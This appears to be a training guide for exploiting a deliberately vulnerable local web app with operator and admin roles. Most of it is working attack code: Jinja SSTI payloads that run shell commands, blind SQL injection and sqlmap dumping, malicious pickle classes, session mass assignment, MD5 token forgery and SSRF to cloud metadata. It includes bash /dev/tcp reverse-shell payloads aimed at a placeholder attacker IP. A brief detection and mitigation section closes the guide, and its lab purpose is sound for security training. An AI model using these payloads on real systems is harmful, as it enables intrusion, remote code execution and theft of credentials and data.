# Advanced Exploitation Guide - Tricky Privilege Escalation

## Updated Role Permissions

### Guest (Read-Only)
- ✓ View dashboards
- ✗ **Cannot control anything**
- ✗ Cannot view logs
- ✗ Cannot generate reports
- ✗ Cannot access admin features

### Operator (Limited Control)
- ✓ Control equipment
- ✓ View **own** logs only
- ✓ Generate reports (SSTI vuln!)
- ✓ Search logs (Blind SQLi!)
- ✓ Export/Import data (Pickle RCE!)
- ✓ Configure settings (Mass assignment!)
- ✓ Token generation (Weak crypto!)
- ✗ **Cannot** access admin panel
- ✗ **Cannot** execute system commands
- ✗ **Cannot** view all logs
- ✗ **Cannot** manage users

### Admin (Full Control)
- ✓ Everything operators can do
- ✓ Access admin panel
- ✓ Execute system commands
- ✓ View all logs
- ✓ Manage users

---

## Advanced Vulnerability #1: Server-Side Template Injection (SSTI)

**Difficulty:** Hard
**Access Required:** Operator or Admin
**Impact:** Remote Code Execution

### Exploit

```bash
# 1. Login as operator
curl -X POST http://localhost:5000/login \
  -d "username=operator&password=operator123" \
  -c cookies.txt

# 2. Test basic SSTI
curl -X POST http://localhost:5000/operator/report \
  -b cookies.txt \
  -d "title=Test&type=summary&template={{7*7}}"

# Output should show: 49 (template executed!)

# 3. Read files
curl -X POST http://localhost:5000/operator/report \
  -b cookies.txt \
  -d 'title=Exploit&template={{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /etc/passwd").read() }}'

# 4. Remote Code Execution
curl -X POST http://localhost:5000/operator/report \
  -b cookies.txt \
  -d 'template={{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("whoami").read() }}'

# 5. Reverse Shell
curl -X POST http://localhost:5000/operator/report \
  -b cookies.txt \
  -d 'template={{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\"").read() }}'
```

### Alternative Payloads

```python
# List all classes
{{''.__class__.__mro__[1].__subclasses__()}}

# Read files
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}

# Config access
{{ config.items() }}

# Execute commands
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

---

## Advanced Vulnerability #2: Blind SQL Injection

**Difficulty:** Hard
**Access Required:** Operator or Admin
**Impact:** Database Extraction, Authentication Bypass

### Time-Based Blind SQLi

```bash
# 1. Login as operator
curl -X POST http://localhost:5000/login \
  -d "username=operator&password=operator123" \
  -c cookies.txt

# 2. Test for vulnerability
curl "http://localhost:5000/operator/search?q=test"

# 3. Boolean-based blind SQLi
curl "http://localhost:5000/operator/search?q=test' AND '1'='1"
# Returns results

curl "http://localhost:5000/operator/search?q=test' AND '1'='2"
# Returns 0 results

# 4. Extract database name
curl "http://localhost:5000/operator/search?q=test' AND (SELECT COUNT(*) FROM sqlite_master WHERE type='table')>0--"

# 5. Extract table names
curl "http://localhost:5000/operator/search?q=test' UNION SELECT name FROM sqlite_master WHERE type='table'--"

# 6. Extract admin password (boolean enumeration)
curl "http://localhost:5000/operator/search?q=test' AND (SELECT password FROM users WHERE username='admin') LIKE 'a%'--"

# Continue with 'ad', 'adm', 'admi', 'admin' to extract password
```

### Using SQLMap

```bash
sqlmap -u "http://localhost:5000/operator/search?q=test" \
  --cookie="session=YOUR_SESSION_COOKIE" \
  --technique=BT \
  --level=5 \
  --risk=3 \
  --dump
```

---

## Advanced Vulnerability #3: Insecure Deserialization (Pickle RCE)

**Difficulty:** Very Hard
**Access Required:** Operator or Admin
**Impact:** Remote Code Execution

### Step-by-Step Exploitation

```python
# 1. Create malicious pickle payload
import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        cmd = ('whoami')  # Your command here
        return os.system, (cmd,)

# Serialize the malicious object
malicious = pickle.dumps(RCE())
encoded = base64.b64encode(malicious).decode()

print(f"Malicious payload: {encoded}")
```

```bash
# 2. Send payload
curl -X POST http://localhost:5000/operator/import \
  -b cookies.txt \
  -d "data=YOUR_ENCODED_PAYLOAD"

# Command executes when unpickled!
```

### Reverse Shell via Pickle

```python
import pickle
import base64

class ReverseShell:
    def __reduce__(self):
        import os
        cmd = "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
        return os.system, (cmd,)

payload = base64.b64encode(pickle.dumps(ReverseShell())).decode()
print(payload)
```

---

## Advanced Vulnerability #4: Mass Assignment / Session Poisoning

**Difficulty:** Medium
**Access Required:** Operator or Admin
**Impact:** Privilege Escalation

### Exploit

```bash
# 1. Login as operator
curl -X POST http://localhost:5000/login \
  -d "username=operator&password=operator123" \
  -c cookies.txt

# 2. Check current config
curl http://localhost:5000/operator/config \
  -b cookies.txt

# Returns: {"current_config": {"username": "operator", "role": "operator", ...}}

# 3. Escalate to admin by overwriting session
curl -X POST http://localhost:5000/operator/config \
  -b cookies.txt \
  -d "role=admin&user_id=1"

# 4. Verify escalation
curl http://localhost:5000/operator/config \
  -b cookies.txt

# Returns: {"current_config": {"username": "operator", "role": "admin", ...}}

# 5. You now have admin access!
curl http://localhost:5000/admin \
  -b cookies.txt

# Success!
```

---

## Advanced Vulnerability #5: Token Forgery

**Difficulty:** Hard
**Access Required:** Operator (to see token format)
**Impact:** Authentication Bypass, Privilege Escalation

### Understanding the Token

```bash
# 1. Login as operator and get token
curl http://localhost:5000/operator/token \
  -b cookies.txt

# Returns:
# {
#   "token": "5d41402abc4b2a76b9719d911017c592",
#   "role": "operator",
#   "timestamp": "1701234567",
#   "hint": "Token format: md5(username:role:timestamp)"
# }
```

### Forge Admin Token

```python
import hashlib
import time

# Generate admin token
username = "admin"
role = "admin"
timestamp = str(int(time.time()))

token_data = f"{username}:{role}:{timestamp}"
token = hashlib.md5(token_data.encode()).hexdigest()

print(f"Forged admin token: {token}")
print(f"Username: {username}")
print(f"Role: {role}")
```

```bash
# 2. Validate forged token
curl -X POST http://localhost:5000/operator/validate \
  -d "token=YOUR_FORGED_TOKEN&username=admin&role=admin"

# 3. You're now logged in as admin!
```

---

## Advanced Vulnerability #6: SSRF (Server-Side Request Forgery)

**Difficulty:** Medium
**Access Required:** Operator or Admin
**Impact:** Internal Network Scanning, Cloud Metadata Access

### Exploits

```bash
# 1. Scan internal network
curl -X POST http://localhost:5000/operator/webhook \
  -b cookies.txt \
  -d "url=http://localhost:22&event=scan"

curl -X POST http://localhost:5000/operator/webhook \
  -b cookies.txt \
  -d "url=http://192.168.1.1:80&event=scan"

# 2. Access cloud metadata (AWS)
curl -X POST http://localhost:5000/operator/webhook \
  -b cookies.txt \
  -d "url=http://169.254.169.254/latest/meta-data/&event=metadata"

# 3. Read local files (if server supports file://)
curl -X POST http://localhost:5000/operator/webhook \
  -b cookies.txt \
  -d "url=file:///etc/passwd&event=file"

# 4. Port scanning
for port in {1..1000}; do
  curl -X POST http://localhost:5000/operator/webhook \
    -b cookies.txt \
    -d "url=http://localhost:$port&event=portscan" \
    2>/dev/null | grep -q "success" && echo "Port $port is open"
done
```

---

## Complete Privilege Escalation Chains

### Chain 1: Operator → Admin (Mass Assignment)

```bash
# 1. Login as operator
curl -X POST http://localhost:5000/login -d "username=operator&password=operator123" -c c.txt

# 2. Escalate via session poisoning
curl -X POST http://localhost:5000/operator/config -b c.txt -d "role=admin"

# 3. Access admin panel
curl http://localhost:5000/admin -b c.txt

# 4. Execute commands
curl -X POST http://localhost:5000/admin/exec -b c.txt -d "command=whoami"
```

### Chain 2: Operator → RCE (SSTI)

```bash
# 1. Login as operator
curl -X POST http://localhost:5000/login -d "username=operator&password=operator123" -c c.txt

# 2. Exploit SSTI for RCE
curl -X POST http://localhost:5000/operator/report -b c.txt \
  -d 'template={{ "".__class__.__mro__[1].__subclasses__()[104].__init__.__globals__["sys"].modules["os"].popen("cat /etc/passwd").read() }}'
```

### Chain 3: Operator → RCE (Pickle Deserialization)

```python
# Create payload
import pickle, base64, os

class Exploit:
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd',))

payload = base64.b64encode(pickle.dumps(Exploit())).decode()
```

```bash
# Execute
curl -X POST http://localhost:5000/operator/import -b cookies.txt -d "data=$payload"
```

### Chain 4: Operator → Admin (Token Forgery)

```python
# Forge token
import hashlib, time
token = hashlib.md5(f"admin:admin:{int(time.time())}".encode()).hexdigest()
```

```bash
# Login with forged token
curl -X POST http://localhost:5000/operator/validate \
  -d "token=$token&username=admin&role=admin"
```

### Chain 5: Operator → Data Extraction (Blind SQLi)

```bash
# Extract admin password using blind SQLi
for char in {a..z} {0..9}; do
  result=$(curl -s "http://localhost:5000/operator/search?q=x' AND (SELECT password FROM users WHERE username='admin') LIKE '$char%'--" -b c.txt | jq -r '.results')
  [ "$result" != "0" ] && echo "Password starts with: $char"
done
```

---

## Detection and Defense

### Detecting These Attacks

**SSTI:**
- Look for `{{`, `{%`, `__class__`, `__mro__` in logs
- Monitor for Template rendering errors
- Watch for unusual subprocess creation

**Blind SQLi:**
- Unusual query patterns
- Many requests with similar structure
- Time-based delays in responses

**Pickle RCE:**
- Monitor for pickle.loads() calls with user data
- Watch for base64-encoded data in import endpoints
- Subprocess spawning from pickle operations

**Mass Assignment:**
- Session modifications outside normal flow
- Role changes without admin action
- Multiple session parameter updates

**Token Forgery:**
- Multiple validation attempts
- Tokens with future/past timestamps
- Same token used from multiple IPs

**SSRF:**
- Internal network requests from web server
- Requests to localhost
- Cloud metadata access attempts

---

## Mitigation Exercises

Practice fixing:
1. **SSTI:** Use `markupsafe.escape()`, don't render user input
2. **Blind SQLi:** Parameterized queries, input validation
3. **Pickle RCE:** Use JSON instead, validate deserialized objects
4. **Mass Assignment:** Whitelist allowed parameters
5. **Token Forgery:** Use strong signing (JWT with secret), shorter expiry
6. **SSRF:** Whitelist URLs, block internal IPs

---

**Challenge:** Can you chain multiple vulnerabilities to go from guest → admin → RCE?

**Hint:** Guest → IDOR to operator → Mass Assignment to admin → Command injection!
